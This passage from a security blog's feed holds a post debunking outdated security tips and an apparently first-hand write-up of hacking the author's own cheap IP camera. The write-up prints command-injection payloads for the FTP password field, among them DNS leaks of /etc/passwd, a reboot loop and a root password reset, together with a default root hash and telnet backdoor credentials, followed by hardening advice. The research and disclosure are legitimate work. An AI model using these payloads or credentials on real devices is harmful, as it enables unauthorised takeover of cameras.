&lt;h3&gt;Questions and answers&lt;/h3&gt;&lt;/div&gt;&lt;div&gt;&lt;ul&gt;&lt;li&gt;Was Russia capable of doing this WADA hack? Yes.&lt;/li&gt;&lt;li&gt;Was Russia hacking WADA? Maybe yes, maybe not.&lt;/li&gt;&lt;li&gt;Was this leak done by a Russian state-sponsored hacker group? I highly doubt that.&lt;/li&gt;&lt;li&gt;Is it possible to buy an attribution-dice where all six-side is Russia? No, it is sold-out. &lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;To quote Patrick Gray: &quot;Russia is the new China, and the Russians ate my homework.&quot;©&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;Let me know what you think about this, and please comment. &lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;Update: As TheGrugq pointed out, Guccifer has been found to alter documents &lt;a href=&quot;https://www.reddit.com/r/EnoughTrumpSpam/comments/4uyih3/russian_hackers_altered_emails_before_release_to/?st=IUJDLSIE&amp;amp;sh=e195e908&quot; style=&quot;font-family: 'Helvetica Neue Light', HelveticaNeue-Light, helvetica, arial, sans-serif;&quot;&gt;https://www.reddit.com/r/EnoughTrumpSpam/comments/4uyih3/russian_hackers_altered_emails_before_release_to/?st=IUJDLSIE&amp;amp;sh=e195e908&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>One reason why InfoSec sucked in the past 20 years - the "security tips" myth</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/myth/security/tips/2016/06/11/One-reason-why-InfoSec-sucked-in-the-past-20-years-the-security-tips-myth.html"/>
   <updated>2016-06-11T13:36:22+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/myth/security/tips/2016/06/11/One-reason-why-InfoSec-sucked-in-the-past-20-years---the-"security-tips"-myth</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;From time to time, I get disappointed how much effort and money is put into securing computers, networks, mobile phones, ... and yet in 2016 here we are, where not much has changed on the defensive side. There are many things I personally blame for this situation, and one of them is the security tips.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The goal of these security tips is that if the average user follows these easy to remember rules, their computer will be safe. Unfortunately, by the time people integrate these rules into their daily life, these rules either become outdated, or these rules were so oversimplified that it was never true in the first place. Some of these security tips might sound ridiculous to people in InfoSec nowadays, but this is exactly what people still remember because we told them so for years.&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;PDF is safe to open&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;This is an oldie. I think this started at the time of macro viruses. Still, people think opening a PDF from an untrusted source is safer than opening a Word file. For details why this is not true, check: https://www.cvedetails.com/vulnerability-list/vendor_id-53/product_id-497/Adobe-Acrobat-Reader.html&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;On an unrelated note, people still believe PDF is integrity protected because the content cannot be changed (compared to a Word document).&lt;/div&gt;
&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/pdf_blog_title.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/pdf_blog_title.jpg&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/pdf_blog_title.jpg&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Image stolen from Kaspersky&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Java is secure&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;One of the best ones. Oracle started marketing Java as a safe language, where buffer overflows, format strings and pointer-based vulnerabilities are gone. Unfortunately, they forgot to tell the world that instead of &quot;unsafe programs developed by others&quot; they installed their unsafe program on 3 billion devices. &lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Jteqd.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Jteqd.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Jteqd.png&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Stay away from rogue websites and you will be safe&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;This is a very common belief I hear from average people. &quot;I only visit some trusted news sites and social media, I never visit those shady sites.&quot; I have some bad news. At the time of &lt;a href=&quot;https://www.google.com/search?q=malvertising&quot; target=&quot;_blank&quot;&gt;malvertising &lt;/a&gt;and infected websites, you don't have to visit those shady sites anymore to get infected.&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Don't use open WiFi&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;I have a very long explanation of why this makes no sense, see &lt;a href=&quot;http://jumpespjump.blogspot.hu/2015/07/mythbusters-is-open-unencrypted-wifi.html&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;. Actually, the whole recommendation makes no sense as people will connect to public WiFis, no matter what we (InfoSec) recommend.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/205975-free_wifi_wireless_original.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/205975-free_wifi_wireless_original.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/205975-free_wifi_wireless_original.jpg&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;The password policy nightmare&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;Actually, this topic has been covered by myself in two blog posts, see &lt;a href=&quot;http://jumpespjump.blogspot.hu/2014/10/change-passwords-regularly-myth-and-lie.html&quot; target=&quot;_blank&quot;&gt;here &lt;/a&gt;and &lt;a href=&quot;http://jumpespjump.blogspot.hu/2014/10/change-passwords-regularly-myth-and-lie_13.html&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;. Long story short: use a password manager and 2-factor authentication wherever possible. Let the password manager choose the password for you. And last but not least, corporate password policy sux.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/df826c798b30070ed3bbbe5dba776e35.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/df826c798b30070ed3bbbe5dba776e35.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/df826c798b30070ed3bbbe5dba776e35.jpg&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Sites with a padlock are safe&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;We tell people for years that the communication with HTTPS sites are safe, and you can be sure it is HTTPS by finding a randomly changing padlock icon somewhere next to the URL. What people hear is that sites with padlocks are safe. Whatever that means. The same goes for WiFi - a network with a padlock is safe.&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/computer-internet-security1-560x420.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/computer-internet-security1-560x420.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/computer-internet-security1-560x420.jpg&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Use Linux, it is free from malware&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;For years people told to Windows users that only if they would use Linux they won't have so much malware. Thanks to Android, now everyone in the world can enjoy malware on his/her Linux machine.&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/android-evil.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/android-evil.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/android-evil.png&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;OSX is free from malware&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;It is true that there is significantly less malware on OSX than on Windows, but this is an &quot;economical&quot; question rather than a &quot;security&quot; one. The more people use OSX, the better target it will become. Some people even believe they are safe from phishing because they are using a Mac!&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/ThreatMetrix-Discusses-Sophisticated-Malware-Targeting-OS-X-2.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/ThreatMetrix-Discusses-Sophisticated-Malware-Targeting-OS-X-2.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/ThreatMetrix-Discusses-Sophisticated-Malware-Targeting-OS-X-2.jpg&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Updated AV + firewall makes me 100% safe&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;There is no such thing as 100% safe, and unfortunately, nowadays most malware is written for PROFIT, which means it can bypass these basic protections for days (or weeks, months, years). The more proactive protection is built into the product, the better!&lt;/div&gt;&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;How to backup data&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;Although this is one of the most important security tips which is not followed by people, my problem here is not the backup data advise, but how we as a community failed to provide easy to use ways to do that. Now that crypto-ransomware is a real threat to every Windows (and some OSX) users, even those people who have backups on their NAS can find their backups lost. The only hope is that at least OSX has Time Machine which is not targeted yet, and the only backup solution which really works.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The worst part is that we even created NAS devices which can be infected via worms ...&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/synolocker.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/synolocker.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/synolocker.png&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Disconnect your computer from the Internet when not used&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;There is no need to comment on this. Whoever recommends things like that, clearly has a problem.&lt;/div&gt;&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Use (free) VPN to protect your anonimity&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;First of all. There is no such thing as &lt;a href=&quot;https://www.safervpn.com/blog/use-free-vpn-hola-risks-cybercrime/&quot; target=&quot;_blank&quot;&gt;free service&lt;/a&gt;. If it is free, you are the service. On another hand, a non-free VPN can &lt;a href=&quot;https://www.mrg-effitas.com/how-your-vpn-can-be-a-front-door-access-to-your-system/&quot; target=&quot;_blank&quot;&gt;introduce new vulnerablities&lt;/a&gt;, and they won't protect your anonymity. It replaces one ISP with another (your VPN provider). Even TOR cannot guarantee anonymity by itself, and VPNs are much worse.&lt;/div&gt;&lt;/div&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;The corporate &quot;security tips&quot; myth&lt;/h2&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;Luckily&quot; these toxic security tips have infected the enterprise environment as well, not just the home users.&lt;/div&gt;&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Use robots.txt to hide secret information on public websites&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;It is 2016 and somehow web developers still believe in this nonsense. And this is why this is usually the first to check on a website for penetration testers or attackers.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;My password policy is safer than ever&lt;/h3&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;As previously discussed, passwords are bad. Very bad. And they will stick with us for decades ...&lt;/div&gt;&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Use WAF, IDS, IPS, Nextgen APT detection hibber-gibber and you will be safe&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Companies should invest more in people and less into magic blinking devices.&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Instead of shipping computers with bloatware, ship computers with exploit protection software&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Teach people how to use a password safe&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Teach people how to use 2FA&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Teach people how to use common-sense&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;Conclusion&lt;/h2&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Computer security is complex, hard and the risks change every year. Is this our fault? Probably. But these kinds of security tips won't help us save the world. &lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>How I hacked my IP camera, and found this backdoor account</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/camera/command/injection/hack/iot/ipcamera/junk/hacking/2015/09/26/How-I-hacked-my-IP-camera,-and-found-this-backdoor-account.html"/>
   <updated>2015-09-26T11:11:59+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/camera/command/injection/hack/iot/ipcamera/junk/hacking/2015/09/26/How-I-hacked-my-IP-camera,-and-found-this-backdoor-account</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;The time has come. I bought my second IoT device - in the form of a cheap IP camera. As it was the most affordable among all others, my expectations regarding security was low. But this camera was still able to surprise me.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;Maybe I will disclose the camera model used in my hack in this blog later, but first, I will try to contact someone regarding these issues. Unfortunately, it seems a lot of different cameras have this problem because they share being developed on the same SDK. Again, my expectations are low on this.&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;The obvious problems&lt;/h2&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/em.png&quot; src=&quot;https://z6543.github.io/_img/em.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/em.png&quot; width=&quot;200&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;I opened the box, and I was greeted with a password of four numeric characters. This is the password for the &quot;admin&quot; user, which can configure the device, watch its output video, and so on. Most people don't care to change this anyway.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;It is obvious that this camera can talk via Ethernet cable or WiFi. Luckily it supports WPA2, but people can configure it for open unprotected WiFi of course. &lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Sniffing the traffic between the camera and the desktop application it is easy to see that it talks via HTTP on port 81. The session management is pure genius. The username and password are sent in every GET request. Via HTTP. Via hopefully not open WiFi. It comes really handy in case you forgot it, but luckily the desktop app already saved the password for you in clear text in &lt;/div&gt;&lt;div style=&quot;&quot;&gt;&quot;C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\VirtualStore\Program Files (x86)\&amp;lt;REDACTED&amp;gt;\list.dat&quot;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;This nice camera communicates to the cloud via UDP. The destination servers are in Hong Kong - user.ipcam.hk/user.easyn.hk - and China - op2.easyn.cn/op3.easyn.cn. In case you wonder why an IP camera needs a cloud connection, it is simple. This IP camera has a mobile app for Android and iOS, and via the cloud, the users don't have to bother to configure port forwards or dynamic DNS to access the camera. Nice.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;Let's run a quick nmap on this device.&lt;/div&gt;
&lt;pre&gt;PORT     STATE SERVICE    VERSION&lt;br /&gt;23/tcp   open  telnet     BusyBox telnetd&lt;br /&gt;81/tcp   open  http       GoAhead-Webs httpd&lt;br /&gt;| http-auth: &lt;br /&gt;| HTTP/1.1 401 Unauthorized&lt;br /&gt;|_  Digest algorithm=MD5 opaque=5ccc069c403ebaf9f0171e9517f40e41 qop=auth realm=GoAhead stale=FALSE nonce=99ff3efe612fa44cdc028c963765867b domain=:81&lt;br /&gt;|_http-methods: No Allow or Public header in OPTIONS response (status code 400)&lt;br /&gt;|_http-title: Document Error: Unauthorized&lt;br /&gt;8600/tcp open  tcpwrapped&lt;br /&gt;&lt;/pre&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;The already known HTTP server, a telnet server via BusyBox, and a port on 8600 (have not checked so far). The 27-page long online manual does not mention any Telnet port. How shall we name this port? A debug port? Or a backdoor port? We will see. I manually tried 3 passwords for the user root, but as those did not work, I moved on.&lt;/div&gt;&lt;br /&gt;&lt;h2&gt;The double-blind command injection&lt;/h2&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;The IP camera can upload photos to a configured FTP server on a scheduled basis. When I configured it, unfortunately, it was not working at all, I got an invalid username/password on the server. After some debugging, it turned out the problem was that I had a special $ character in the password. And this is where the real journey began. I was sure this was a command injection vulnerability, but not sure how to exploit it. There were multiple problems that made the exploitation harder. I call this vulnerability double-blind command injection. The first blind comes from the fact that we cannot see the output of the command, and the second blind comes from the fact that the command was running in a different process than the webserver, thus any time-based injection involving sleep was not a real solution.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;But the third problem was the worst. It was limited to 32 characters. I was able to leak some information via DNS, like with the following commands I was able to see the current directory:&lt;/div&gt;&lt;pre&gt;$(ping%20-c%202%20%60pwd%60)&lt;/pre&gt;or cleaning up after URL decode:  &lt;br /&gt;&lt;pre&gt;$(ping -c 2 `pwd`)&lt;/pre&gt;but whenever I tried to leak information from /etc/passwd, I failed. I tried $(reboot) which was a pretty bad idea, as it turned the camera into an infinite reboot loop, and the hard reset button on the camera failed to work as well. Fun times.&lt;br /&gt;&lt;br /&gt;The following are some examples of my desperate trying to get shell access. And this is the time to thank EQ for his help during the hacking session night, and for his great ideas.&lt;br /&gt;&lt;pre&gt;$(cp /etc/passwd /tmp/a)       ;copy /etc/passwd to a file which has a shorter name&lt;br /&gt;$(cat /tmp/a|head -1&amp;gt;/tmp/b)   ;filter for the first row&lt;br /&gt;$(cat&amp;lt;/tmp/b|tr -d ' '&amp;gt;/tmp/c) ;filter out unwanted characters&lt;br /&gt;$(ping `cat /tmp/c`)           ;leak it via DNS&lt;br /&gt;&lt;/pre&gt;After I finally hacked the camera, I saw the problem. There is no head, tr, less, more or cut on this device ... Neither netcat, bash ...&lt;br /&gt;&lt;br /&gt;I also tried &lt;a href=&quot;https://github.com/stasinopoulos/commix&quot; target=&quot;_blank&quot;&gt;commix&lt;/a&gt;, as it looked promising on &lt;a href=&quot;https://www.youtube.com/watch?t=297&amp;amp;v=aVTGqiyVz5o&quot; target=&quot;_blank&quot;&gt;Youtube&lt;/a&gt;. Think commix like sqlmap, but for command injection. But this double-blind hack was a bit too much for this automated tool, unfortunately.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/camera2.png&quot; src=&quot;https://z6543.github.io/_img/camera2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/camera2.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;But after spending way too much time without progress, I finally found the password to Open Sesame.&lt;br /&gt;&lt;pre&gt;$(echo 'root:passwd'|chpasswd)&lt;/pre&gt;Now, logging in via telnet&lt;br /&gt;&lt;pre&gt;(none) login: root&lt;br /&gt;Password:&lt;br /&gt;&lt;br /&gt;BusyBox v1.12.1 (2012-11-16 09:58:14 CST) built-in shell (ash)&lt;br /&gt;Enter 'help' for a list of built-in commands.&lt;br /&gt;#&lt;br /&gt;&lt;br /&gt;&lt;/pre&gt;Woot woot :) I quickly noticed the root of the command injection problem:&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;# cat /tmp/ftpupdate.sh&lt;br /&gt;/system/system/bin/ftp -n&amp;lt;&amp;lt;!&lt;br /&gt;open ftp.site.com 21&lt;br /&gt;user ftpuser $(echo 'root:passwd'|chpasswd)&lt;br /&gt;binary&lt;br /&gt;mkdir  PSD-111111-REDACT&lt;br /&gt;cd PSD-111111-REDACT&lt;br /&gt;lcd /tmp&lt;br /&gt;put 12.jpg 00_XX_XX_XX_XX_CA_PSD-111111-REDACT_0_20150926150327_2.jpg&lt;br /&gt;close&lt;br /&gt;bye&lt;br /&gt;&lt;/pre&gt;&lt;br /&gt;&lt;div style=&quot;&quot;&gt;Whenever a command is put into the FTP password field, it is copied into this script, and after the script is scheduled, it is interpreted by the shell as commands. After this I started to panic that I forgot to save the content of the /etc/passwd file, so how am I going to crack the default telnet password? &quot;Luckily&quot;, rebooting the camera restored the original password. &lt;/div&gt;&lt;br /&gt;root:LSiuY7pOmZG2s:0:0:Administrator:/:/bin/sh&lt;br /&gt;&lt;br /&gt;&lt;div style=&quot;&quot;&gt;Unfortunately, there is no need to start good-old John The Ripper for this task, as Google can tell you that this is the hash for the password 123456. It is a bit more secure than a &lt;a href=&quot;https://www.youtube.com/watch?v=a6iW-8xPw3k&quot; target=&quot;_blank&quot;&gt;luggage password&lt;/a&gt;.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/camera.png&quot; src=&quot;https://z6543.github.io/_img/camera.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/camera.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;It is time to recap what we have. &lt;b&gt;&lt;u&gt;There is an undocumented telnet port on the IP camera, which can be accessed by default with root:123456, there is no GUI to change this password, and changing it via console, it only lasts until the next reboot. I think it is safe to tell this a backdoor.&lt;/u&gt;&lt;/b&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;With this console access we can access the password for the FTP server, for the SMTP server (for alerts), the WiFi password (although we probably already have it), access the regular admin interface for the camera, or just modify the camera as we want. In most deployments, luckily this telnet port is behind NAT or firewall, so not accessible from the Internet. But there are always exceptions. Luckily, UPNP does not configure the Telnet port to be open to the Internet, only the camera HTTP port 81. You know, the one protected with the 4 character numeric password by default.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Last but not least everything is running as root, which is not surprising. &lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;My hardening list&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;I added these lines to the end of /system/init/ipcam.sh:&lt;/div&gt;&lt;pre&gt;sleep 15&lt;br /&gt;echo 'root:CorrectHorseBatteryRedStaple'|chpasswd&lt;br /&gt;&lt;/pre&gt;&lt;div style=&quot;&quot;&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Also, if you want, you can disable the telnet service by commenting out telnetd in /system/init/ipcam.sh.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;If you want to disable the cloud connection (thus rendering the mobile apps unusable), put the following line into the beginning of /system/init/ipcam.sh&lt;/div&gt;&lt;pre&gt;iptables -A OUTPUT -p udp ! --dport 53 -j DROP&lt;/pre&gt;&lt;pre&gt;&lt;/pre&gt;&lt;div style=&quot;&quot;&gt;&lt;/div&gt;You can use OpenVPN to connect into your home network and access the web interface of the camera. It works from Android, iOS, and any desktop OS.&lt;br /&gt;&lt;h2&gt;My TODO list&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;&lt;ul&gt;&lt;li&gt;Investigate the script /system/system/bin/gmail_thread&lt;/li&gt;&lt;li&gt;Investigate the cloud protocol * - see update 2016 10 27&lt;/li&gt;&lt;li&gt;Buy a Raspberry Pie, integrate with a good USB camera, and watch this IP camera to burn&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;A quick googling revealed I am not the first finding this telnet backdoor account in IP cameras, although others found it via JTAG firmware dump. &lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;And 99% of the people who buy these IP cameras think they will be safe with it. Now I understand the sticker which came with the IP camera.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2015-09-252B18.58.41.jpg&quot; src=&quot;https://z6543.github.io/_img/2015-09-252B18.58.41.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2015-09-252B18.58.41.jpg&quot; width=&quot;223&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;When in the next episode of Mr. Robot, you see someone logging into an IP camera via telnet with root:123456, you will know, it is the sad reality.&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;If you are interested in generic ways to protect your home against IoT, read &lt;a href=&quot;http://jumpespjump.blogspot.nl/2015/08/how-to-secure-your-home-against.html&quot; target=&quot;_blank&quot;&gt;my previous blog post&lt;/a&gt; on this. 